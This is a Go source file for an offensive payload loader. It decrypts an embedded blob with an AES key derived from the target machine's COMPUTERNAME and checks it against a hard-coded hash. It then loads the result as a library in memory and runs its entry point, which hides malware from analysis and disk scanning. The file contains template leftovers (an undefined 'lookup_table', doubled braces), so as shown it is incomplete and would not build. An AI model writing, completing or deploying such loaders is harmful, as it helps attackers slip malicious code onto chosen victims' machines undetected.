
package main


/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"

import (
        "bytes"
	"unsafe"
	"compress/zlib"
	"encoding/base64"
	"strings"
	"crypto/aes"
	"io"
	"encoding/hex"
	"os"
	"crypto/sha512"
	"crypto/cipher"
	
)

func check(e error) bool{
    if e != nil {
        return false
    }
    return true
}


func build_code(payload []byte, payload_hash []byte, minus_bytes int, key_combos [][]string) []byte{
    
    
    
    var output bytes.Buffer
    
    data, err := base64.StdEncoding.DecodeString(string(payload))

    var b bytes.Buffer
    
    b.Write([]byte(data))

    r, _ := zlib.NewReader(&b)
    io.Copy(&output, r)
    r.Close()
    


    

    iv := make([]byte, 16)
    _, err = output.Read(iv)
    check(err)

    
    

    size_of_full_table := output.Len()

    encrypted_payload := make([]byte, size_of_full_table)
    
    _, err = output.Read(encrypted_payload)
        

    

    key_list := []string{} 
    
    
    for _, item := range key_combos {
        
        
        if len(item) == 0{
            continue
        }
        if len(item) == 1{
            
            
            if len(key_list) == 0{
                
                key_list = append(key_list, item[0])
            }else{
                another_temp := []string{}
                for _, existing_value := range key_list{
                    another_temp = append(another_temp, existing_value + item[0])
                }
                key_list = another_temp
            }   
        
        }else{
            
            if len(key_list) == 0 {
                
                for _,astring := range item {
                    key_list = append(key_list, astring)

                }
            } else {

                another_temp := []string{}
                for _, sub_item := range item{
                    
                        for _,existing_value := range key_list {
                            
                            another_temp = append(another_temp, existing_value + sub_item)
                        }
                }
                key_list = another_temp
            }
            
        }
        
    }
    
    for _, key := range key_list{
        temp_encrypted_payload := make([]byte, len(encrypted_payload))
        copy(temp_encrypted_payload, encrypted_payload)
        raw_key := []byte(key)
        

        kIterations := 10000
        
        raw_key_512 := sha512.Sum512(raw_key)
        for kIterations > 1 {
            raw_key_512 = sha512.Sum512(raw_key_512[:])
            kIterations -= 1
        }

        
        password := raw_key_512[:32]


        aesBlock, err3 := aes.NewCipher(password)
        check(err3)

        cfbDecrypter := cipher.NewCFBDecrypter(aesBlock, iv)
        cfbDecrypter.XORKeyStream(temp_encrypted_payload, temp_encrypted_payload)
        s := bytes.TrimRight(temp_encrypted_payload, "{")

        decoded_payload, err := base64.StdEncoding.DecodeString(string(s))
        
        if check(err) == false{
            continue
        }
        

        
        payload_test_hash := sha512.Sum512(decoded_payload[:len(decoded_payload) - minus_bytes])
        
        final_result := bytes.Equal(payload_test_hash[:], payload_hash[:])
        if final_result == true {
            return decoded_payload
        } else {
            return nil
        }  
    }
    return nil

}


func pull_environmentals(environmentals []string) string {
    env_string := ""
    for _,itr := range environmentals {
        env_string += os.Getenv(itr)
    }
    return(strings.ToLower(env_string))
}


func main() {
    
    
    payload_hash, err := hex.DecodeString("b2561de07a9f839dd87123c2748a588603158abdce3f763c114a60e4f2d286320095992af3a8d844059d73f99f87e5005d07fc3c64ff863f2f62da865a992a09")
    check(err)
    
    
    minus_bytes := int(1)
    
    start_loc := string(``)
    
    key_combos := make([][]string, 1) 
    
    i := int(0)

    
    

    env_vars := []string{"computername"}

    key_combos[i] = []string{pull_environmentals(env_vars)}
    i += 1

	full_payload := build_code(lookup_table, payload_hash, minus_bytes, key_combos)
	if full_payload == nil{{
		os.Exit(1)
	}}

    
	
	handle := C.MemoryLoadLibraryEx(unsafe.Pointer(&full_payload[0]),
                                    (C.size_t)(len(full_payload)),
                                    (*[0]byte)(C.MemoryDefaultLoadLibrary),    
                                    (*[0]byte)(C.MemoryDefaultGetProcAddress), 
                                    (*[0]byte)(C.MemoryDefaultFreeLibrary),    
                                    unsafe.Pointer(nil),                 
    )
    if handle == nil {
            os.Exit(1)
    }

    
    _ = C.MemoryCallEntryPoint(handle)
    
    C.MemoryFreeLibrary(handle)

    
   _ = start_loc

    
}